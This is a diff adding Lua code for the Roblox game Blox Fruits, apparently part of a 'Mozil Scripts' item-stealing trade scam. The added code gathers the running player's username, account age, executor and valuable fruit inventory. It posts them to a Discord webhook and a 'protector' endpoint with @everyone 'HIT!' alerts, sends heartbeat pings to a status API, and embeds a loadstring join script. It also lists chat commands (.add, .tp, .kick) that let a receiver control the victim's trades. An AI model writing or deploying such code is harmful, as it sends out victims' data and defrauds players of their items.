+		if not p29:IsA("TextChannel") then
+			return
+		end
+
+		local ok3, result3 = pcall(function()
+			return p29.MessageReceived
+		end)
+
+		if not ok3 or not result3 then
+			return
+		end
+
+		result3:Connect(v251)
+	end
+
+	local RBXGeneral = TextChannels:FindFirstChild("RBXGeneral") or TextChannels:FindFirstChild("All")
+
+	if RBXGeneral then
+		v257(RBXGeneral)
+	end
+
+	for _, child in ipairs(TextChannels:GetChildren()) do
+		v257(child)
+	end
+
+	TextChannels.ChildAdded:Connect(function(child)
+		v257(child)
+	end)
+end)
+
+local StatusApi = v7.StatusApi or ""
+local u264 = false
+
+local function v265(p30)
+	if type(p30) ~= "string" then
+		return nil
+	end
+
+	local match = p30:match("wh_[%w_]+")
+
+	if match then
+		return match
+	end
+
+	return (p30:match("([^/]+)$"))
+end
+local function v267(p31)
+	if u264 then
+		return
+	end
+
+	u264 = true
+
+	if StatusApi == "" then
+		return
+	end
+
+	if not request_ or type(request_) ~= "function" then
+		warn("[Status] No HTTP request fn, skip heartbeat")
+
+		return
+	end
+
+	task.spawn(function()
+		while task.wait(5) do
+			if StatusApi == "" then
+				break
+			end
+
+			local ok2, result2 = pcall(function()
+				return request_({
+					Url = StatusApi .. "/ping",
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					},
+					Body = HttpService:JSONEncode({
+						sessionId = p31
+					})
+				})
+			end)
+
+			if not ok2 then
+				warn("[Status] Heartbeat failed:", result2)
+			end
+		end
+	end)
+end
+local function v270(p32, p33, p34, p35)
+	if StatusApi == "" then
+		return
+	end
+
+	if not request_ or type(request_) ~= "function" then
+		warn("[Status] No HTTP request fn, skip register")
+
+		return
+	end
+
+	local v271 = string.format("%d-%s-%d", LocalPlayer.UserId, tostring(game.JobId), os.time())
+	local t12 = {
+		sessionId = v271,
+		vaultId = p32,
+		messageId = tostring(p33),
+		channelId = tostring(p34),
+		username = LocalPlayer.Name,
+		displayName = LocalPlayer.DisplayName
+	}
+
+	t12.executor = identifyexecutor and identifyexecutor() or "Unknown"
+	t12.placeId = game.PlaceId
+	t12.jobId = tostring(bypassJobId_)
+	t12.embed = p35
+
+	local ok2, result2 = pcall(function()
+		return request_({
+			Url = StatusApi .. "/register",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode(t12)
+		})
+	end)
+
+	if ok2 then
+		v267(v271)
+
+		return
+	end
+
+	warn("[Status] Register failed:", result2)
+end
+local function v275(p36)
+	local v276 = tostring(p36 or "")
+
+	if v276 == "" then
+		return v276
+	end
+
+	if v276:lower():find("wait=") then
+		return v276
+	end
+
+	if v276:find("?", 1, true) then
+		return v276 .. "&wait=true"
+	end
+
+	return v276 .. "?wait=true"
+end
+local function v277()
+	return "```🟢 Connected```"
+end
+
+local t13 = {
+	"Dragon",
+	"Kitsune",
+	"Yeti",
+	"Tiger",
+	"Spirit",
+	"Control",
+	"Gas",
+	"Venom",
+	"Shadow",
+	"Dough",
+	"T-Rex",
+	"Mammoth",
+	"Gravity",
+	"Blizzard",
+	"Portal",
+	"Phoenix",
+	"Sound",
+	"Buddha",
+	"Quake",
+	"Magma",
+	"Light",
+	"Diamond",
+	"Dark",
+	"Sand",
+	"Ice",
+	"Flame",
+	"Smoke",
+	"Bomb",
+	"Spring",
+	"Blade",
+	"Spin",
+	"Rocket"
+}
+local t14 = {
+	Gravity = "☄️",
+	Mammoth = "🦣",
+	["T-Rex"] = "🦖",
+	Dough = "🍩",
+	Shadow = "🌑",
+	Venom = "🐍",
+	Gas = "☁️",
+	Control = "🌀",
+	Spirit = "👻",
+	Tiger = "🐯",
+	Yeti = "☃️",
+	Kitsune = "🦊",
+	Dragon = "🐲"
+}
+
+local function v280(p37)
+	if not p37 then
+		return "🍎"
+	end
+
+	local v281 = p37:lower()
+
+	for _, v in ipairs(t13) do
+		if v281:find(v:lower(), 1, true) then
+			return t14[v] or "🍎"
+		end
+	end
+
+	return "🍎"
+end
+
+local t15 = {
+	"Uncommon",
+	"Rare",
+	"Legendary",
+	"Mythical",
+	"Premium",
+	[0] = "Common"
+}
+
+local function v285()
+	local ok2, result2 = pcall(function()
+		local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+
+		if not PlayerGui then
+			return nil
+		end
+
+		local Main = PlayerGui:FindFirstChild("Main")
+
+		if not Main then
+			return nil
+		end
+
+		local Version = Main:FindFirstChild("Version")
+
+		if not Version then
+			return nil
+		end
+
+		local match = tostring(Version.ContentText or Version.Text or ""):lower():match("sea%s*([0-9]+)")
+
+		if not match then
+			return nil
+		end
+
+		local v292 = tonumber(match)
+
+		if v292 == 1 or v292 == 2 or v292 == 3 then
+			return v292
+		end
+
+		return nil
+	end)
+
+	if ok2 then
+		return result2
+	end
+
+	return nil
+end
+local function v293()
+	if game.PlaceId == 2753915549 then
+		return 1
+	end
+
+	if game.PlaceId ~= 4442272183 then
+		if game.PlaceId ~= 79091703265657 then
+			if game.PlaceId == 7449423635 or game.PlaceId == 100117331123089 then
+				return 3
+			end
+
+			local v294 = v285()
+
+			if v294 then
+				return v294
+			end
+
+			return 3
+		end
+	end
+
+	return 2
+end
+local function v295(p38)
+	if not p38 or p38 == "" then
+		return "Unknown Server"
+	end
+
+	local t16 = {
+		"Big",
+		"Small",
+		"Large",
+		"Strong",
+		"Powerful",
+		"Weak",
+		"Overpowered",
+		"Bad",
+		"Odd",
+		"Rich",
+		"Short",
+		"Adorable",
+		"Alive",
+		"Colorful",
+		"Angry",
+		"Good",
+		"Beautiful",
+		"Ugly",
+		"Hot",
+		"Cold",
+		"Evil",
+		"Famous",
+		"Original",
+		"Unoriginal",
+		"Kind",
+		"Nice",
+		"Real",
+		"Expensive",
+		"Wild",
+		"Wide",
+		"Fake",
+		"Proud",
+		"Super",
+		"Strange",
+		"Wrong",
+		"Right",
+		"Talented",
+		"Complex",
+		"Pure",
+		"Fancy",
+		"Lucky",
+		"Fresh",
+		"Fantastic",
+		"Dull",
+		"Dizzy",
+		"Eternal",
+		"Mental",
+		"Infinite",
+		"Rogue"
+	}
+	local t17 = {
+		"TAWG",
+		"Robson",
+		"Krazy",
+		"Fruit",
+		"Realm",
+		"World",
+		"Place",
+		"Experience",
+		"Dog",
+		"Cat",
+		"Guy",
+		"Bird",
+		"Legion",
+		"Gank",
+		"Family",
+		"Sun",
+		"Moon",
+		"Gun",
+		"Sword",
+		"Melee",
+		"Defense",
+		"Bomb",
+		"Spike",
+		"Chop",
+		"Spring",
+		"Smoke",
+		"Flame",
+		"Ice",
+		"Sand",
+		"Dark",
+		"Light",
+		"Rubber",
+		"Barrier",
+		"Magma",
+		"Leopard",
+		"Quake",
+		"Buddha",
+		"Spider",
+		"Phoenix",
+		"Rumble",
+		"Love",
+		"Door",
+		"Paw",
+		"Gravity",
+		"Dough",
+		"Venom",
+		"Control",
+		"Dragon",
+		"Falcon",
+		"Diamond",
+		"Kilo",
+		"Shark",
+		"Human",
+		"Angel",
+		"Rabbit",
+		"Spin",
+		"Topic",
+		"Red",
+		"Blue",
+		"Green",
+		"Yellow",
+		"Soul",
+		"Shadow"
+	}
+	local v298 = Random.new(tonumber("0x" .. tostring(p38):gsub("-", ""):sub(1, 7)) or 0)
+
+	return t16[v298:NextInteger(1, #t16)] .. " " .. t17[v298:NextInteger(1, #t17)] .. " #" .. string.format("%04d", v298:NextInteger(1, 9999))
+end
+local function v299()
+	local v300 = tostring(bypassJobId_ or game.JobId or "unknown job")
+
+	return (v295(v300))
+end
+local function v301()
+	return "Join this server using the script below, then use commands like **.add, .addallfruits, .addallpre, .clear, .clearall, .reset, .tp, .kick** to control the trade."
+end
+local function v302(p39)
+	local identifyexecutor_ = identifyexecutor and identifyexecutor() or "Unknown"
+	local v304 = v293()
+	local t18 = {}
+	local v306 = string.format("👤Display Name : %s", LocalPlayer.DisplayName)
+	local v307 = string.format("🆔Username     : %s", LocalPlayer.Name)
+	local s3 = "📅Account Age  : %d days"
+	local AccountAge = LocalPlayer.AccountAge or 0
+
+	do
+		local values = table.pack(v306, v307, string.format(s3, AccountAge), string.format("🖥️Executor     : %s", identifyexecutor_), string.format("🌊Sea          : %s", tostring(v304)))
+
+		table.move(values, 1, values.n, 1, t18)
+	end
+
+	if p39 ~= false then
+		table.insert(t18, string.format("😎 Receiver    : %s", t1 and #t1 > 0 and table.concat(t1, ", ") or "Unknown"))
+	end
+
+	return "```" .. table.concat(t18, "\n") .. "```"
+end
+local function v311()
+	local v312 = v66()
+	local v313 = false
+	local v314 = false
+	local v315 = next(t3) ~= nil
+
+	for _, v in pairs(v312) do
+		local Type = v.Type
+
+		if Type == "Premium" then
+			if (v.Count or 0) > 0 then
+				v313 = true
+			end
+		end
+
+		if v315 and not v314 and Type == "Blox Fruit" then
+			local v319 = (v.DisplayName or v.Name or ""):lower()
+
+			for k in pairs(t3) do
+				if v319:find(k, 1, true) then
+					v314 = true
+
+					break
+				end
+			end
+		end
+
+		if not v313 then
+			continue
+		elseif not v314 then
+			continue
+		end
+
+		break
+	end
+
+	return v313, v314
+end
+local function v321()
+	local v322 = v66()
+	local t19 = {}
+
+	for _, v in pairs(v322) do
+		if type(v) == "table" then
+			local Type = v.Type
+			local Rarity = v.Rarity or 0
+			local v328 = t15[Rarity] or "Rarity " .. tostring(Rarity)
+			local DisplayName = v.DisplayName or v.Name or "Unknown"
+			local Count = v.Count or 1
+			local v331 = DisplayName:lower()
+			local v332 = Type == "Premium"
+			local v333 = Type == "Mutated Fruit"
+			local v334 = Type == "Blox Fruit"
+
+			if v332 or v333 or v334 then
+				local v335 = v62(DisplayName)
+				local s4
+
+				if v332 then
+					s4 = "💎"
+				elseif v333 then
+					s4 = "👑"
+				elseif v335 then
+					s4 = "🎨"
+				else
+					s4 = v280(DisplayName)
+				end
+
+				local n3
+
+				if v332 then
+					n3 = 1
+				elseif v333 then
+					n3 = 2
+				elseif v334 then
+					n3 = 3
+				else
+					n3 = 4
+				end
+
+				local v338 = v335 and 0 or 1
+				local n4 = 2
+
+				if v334 then
+					if v331:find("dragon", 1, true) then
+						n4 = 0
+					elseif v331:find("galaxy", 1, true) and v331:find("kitsune", 1, true) then
+						n4 = 1
+					end
+				end
+
+				local v340 = t6[Rarity] or 999
+				local Value = v.Value or 0
+
+				table.insert(t19, {
+					line = string.format("%s [%s] %s - %dx", s4, v328, DisplayName, Count),
+					sortType = n3,
+					sortSpecial = n4,
+					sortSkin = v338,
+					sortRarity = v340,
+					sortValue = Value,
+					sortName = DisplayName
+				})
+			end
+		end
+	end
+
+	table.sort(t19, function(p40, p41)
+		if p40.sortType ~= p41.sortType then
+			return p40.sortType < p41.sortType
+		end
+
+		if p40.sortSpecial ~= p41.sortSpecial then
+			return p40.sortSpecial < p41.sortSpecial
+		end
+
+		if p40.sortSkin ~= p41.sortSkin then
+			return p40.sortSkin < p41.sortSkin
+		end
+
+		if p40.sortRarity ~= p41.sortRarity then
+			return p40.sortRarity < p41.sortRarity
+		end
+
+		if p40.sortValue == p41.sortValue then
+			return p40.sortName < p41.sortName
+		end
+
+		return p40.sortValue > p41.sortValue
+	end)
+
+	local t20 = {}
+
+	for _, v in ipairs(t19) do
+		table.insert(t20, v.line)
+	end
+
+	return t20
+end
+local function v345(p42)
+	local v346 = p42 or 900
+	local v347 = v321()
+
+	if #v347 == 0 then
+		v347 = { "None" }
+	end
+
+	local t21 = {}
+	local n5 = 0
+	local v350 = false
+
+	for _, v in ipairs(v347) do
+		local v353 = tostring(v)
+
+		if v353 == "and more..." or v353 == "...and more" then
+			v350 = true
+
+			break
+		end
+
+		local v354 = #v353
+
+		if #t21 > 0 then
+			v354 += 1
+		end
+
+		if not (n5 + v354 <= v346) then
+			v350 = true
+
+			break
+		end
+
+		table.insert(t21, v353)
+		n5 += v354
+	end
+
+	if v350 and t21[#t21] ~= "and more..." then
+		table.insert(t21, "and more...")
+	end
+
+	return "```" .. table.concat(t21, "\n") .. "```"
+end
+
+local t22 = {
+	"gravity",
+	"mammoth",
+	"t-rex",
+	"t rex",
+	"dough",
+	"shadow",
+	"venom",
+	"gas",
+	"control",
+	"spirit",
+	"tiger",
+	"yeti",
+	"kitsune",
+	"dragon",
+	"portal",
+	"quake",
+	"buddha",
+	"string",
+	"love",
+	"pain",
+	"blizzard"
+}
+
+local function v356()
+	local v357 = v66()
+
+	for _, v in pairs(v357) do
+		if v.Type ~= "Premium" then
+			continue
+		end
+
+		local v360 = (v.DisplayName or v.Name or ""):lower()
+
+		if not v360:find("permanent", 1, true) then
+			continue
+		end
+
+		for _, v2 in ipairs(t22) do
+			if v360:find(v2, 1, true) then
+				return true
+			end
+		end
+	end
+
+	return false
+end
+local function v363()
+	local v364 = v66()
+	local v365 = false
+	local v366 = false
+
+	for _, v in pairs(v364) do
+		local v369 = (v.DisplayName or v.Name or ""):lower()
+
+		if v369:find("dragon", 1, true) then
+			if v.Type == "Premium" and v369:find("permanent", 1, true) then
+				v366 = true
+			elseif v.Type == "Blox Fruit" then
+				v365 = true
+			end
+		end
+	end
+
+	if v365 then
+		return true, true
+	end
+
+	if v366 then
+		return true, false
+	end
+
+	return false, false
+end
+local function v370()
+	local v371 = v66()
+
+	for _, v in pairs(v371) do
+		if v.Type ~= "Mutated Fruit" then
+			continue
+		end
+
+		if (v.Count or 0) > 0 then
+			return true
+		end
+	end
+
+	return false
+end
+local function v374()
+	return "```lua\n" .. table.concat({
+		"getgenv().USERNAME = \"" .. LocalPlayer.Name .. "\"",
+		"loadstring(game:HttpGet(\"" .. JoinScriptURL .. "\"))()"
+	}, "\n") .. "\n```"
+end
+local function v375()
+	local v376 = "getgenv().USERNAME = \"" .. LocalPlayer.Name .. "\"\n" .. "loadstring(game:HttpGet(\"" .. JoinScriptURL .. "\"))()"
+	local v377, v378 = v311()
+	local v379 = false
+	local v380 = false
+	local v381 = false
+	local v382 = v66()
+
+	for _, v in pairs(v382) do
+		local Type = v.Type
+
+		if (v.Count or 0) > 0 then
+			local v386 = (v.DisplayName or v.Name or ""):lower()
+
+			if Type == "Blox Fruit" then
+				if not v379 and v386:find("dragon", 1, true) then
+					v379 = true
+				end
+
+				if not v380 and v386:find("kitsune", 1, true) then
+					v380 = true
+				end
+			elseif Type == "Mutated Fruit" then
+				v381 = true
+			end
+		end
+	end
+
+	local s5
+
+	if v377 then
+		s5 = "-- @everyone PREMIUM HIT!"
+	elseif v381 then
+		s5 = "-- @everyone MUTATED FRUITS HIT!"
+	elseif v379 then
+		s5 = "-- @everyone DRAGON HIT!"
+	elseif v380 then
+		s5 = "-- @everyone KITSUNE HIT!"
+	elseif v378 then
+		s5 = "-- @everyone"
+	end
+
+	if s5 then
+		return s5 .. "\n" .. v376
+	end
+
+	return v376
+end
+local function v388()
+	if not request_ then
+		warn("[BF Trade] No HTTP request function, skip embed")
+
+		return
+	end
+
+	local v389 = v375()
+	local t23 = {
+		title = "MozilOnTop • Blox Fruits Hit [<:mozil2:1438776373434122351>]",
+		color = 7101671
+	}
+	local fields = {
+		{
+			name = "🛠️ How to use?",
+			value = v301(),
+			inline = false
+		},
+		{
+			name = "💻 Server Info",
+			value = v299(),
+			inline = false
+		},
+		{
+			name = "📃 Player Info",
+			value = v302(true),
+			inline = false
+		},
+		{
+			name = "📡 Player Status",
+			value = v277(),
+			inline = false
+		},
+		{
+			name = "💰 Valuable Items",
+			value = v345(900),
+			inline = false
+		},
+		{
+			name = "📜 Join Script",
+			value = v374(),
+			inline = false
+		}
+	}
+
+	t23.fields = fields
+	t23.image = {
+		url = "https://tr.rbxcdn.com/180DAY-9562aea76052b8e6690596750b666b26/768/432/Image/Webp/noFilter"
+	}
+	t23.footer = {
+		text = "Mozil Scripts - Blox Fruits"
+	}
+
+	local t30 = {
+		title = t23.title,
+		color = t23.color,
+		fields = {
+			{
+				name = "📃 Player Info",
+				value = v302(false),
+				inline = false
+			},
+			{
+				name = "💰 Valuable Items",
+				value = v345(900),
+				inline = false
+			}
+		},
+		image = t23.image,
+		footer = t23.footer
+	}
+	local v399
+	local v400
+
+	if s1 == "" then
+		warn("[BF Trade] No webhook configured, skip main embed")
+	else
+		local json = HttpService:JSONEncode({
+			content = v389,
+			allowed_mentions = {
+				parse = { "everyone" }
+			},
+			embeds = { t23 },
+			mozil_meta = {
+				game = "bloxfruits",
+				script = "bf_trade",
+				placeId = game.PlaceId,
+				jobId = tostring(bypassJobId_ or ""),
+				userId = LocalPlayer and LocalPlayer.UserId or 0,
+				username = LocalPlayer and LocalPlayer.Name or "Unknown"
+			}
+		})
+		local ok2, result2 = pcall(function()
+			return request_({
+				Url = v275(s1),
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = json
+			})
+		end)
+
+		if ok2 and result2 then
+			local Body
+
+			if type(result2) == "table" then
+				Body = result2.Body or result2.body or result2.responseBody or result2.ResponseBody or ""
+			else
+				Body = tostring(result2)
+			end
+
+			if Body ~= "" then
+				local ok3, result3 = pcall(function()
+					return HttpService:JSONDecode(Body)
+				end)
+
+				if ok3 and type(result3) == "table" and result3.id and result3.channel_id then
+					v399 = tostring(result3.id)
+					v400 = tostring(result3.channel_id)
+				end
+			end
+		else
+			warn("[BF Trade] Webhook POST failed:", result2)
+		end
+	end
+
+	if v399 then
+		local v407 = v265(s1)
+
+		if v407 then
+			v270(v407, v399, v400, t23)
+		end
+	end
+
+	if BloxFruitProtectorURL ~= "" then
+		local now = os.time()
+		local v409 = tostring(now) .. "-" .. tostring(LocalPlayer.UserId) .. "-" .. tostring(math.random(1, 10000000))
+		local t31 = {
+			game = "bloxfruits",
+			user_id = LocalPlayer.UserId,
+			username = LocalPlayer.Name,
+			place_id = PlaceId,
+			job_id = tostring(bypassJobId_),
+			ts = now,
+			nonce = v409,
+			public_embeds = { t30 }
+		}
+		local v411 = v363()
+		local v413 = v356()
+		local v414 = v370()
+
+		if v411 or v413 or v414 then
+			t31.top_embeds = { t30 }
+		end
+
+		local json = HttpService:JSONEncode(t31)
+		local ok2, result2 = pcall(function()
+			return request_({
+				Url = v275(BloxFruitProtectorURL),
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = json
+			})
+		end)
+
+		if not ok2 then
+			warn("[BF Trade] Protector POST failed:", result2)
+		end
+	end
+end
+
+task.spawn(function()
+	local ok2, result2 = pcall(v388)
+
+	if not ok2 then
+		warn("[BF Trade] Inventory embed error:", result2)
+	end
+end)
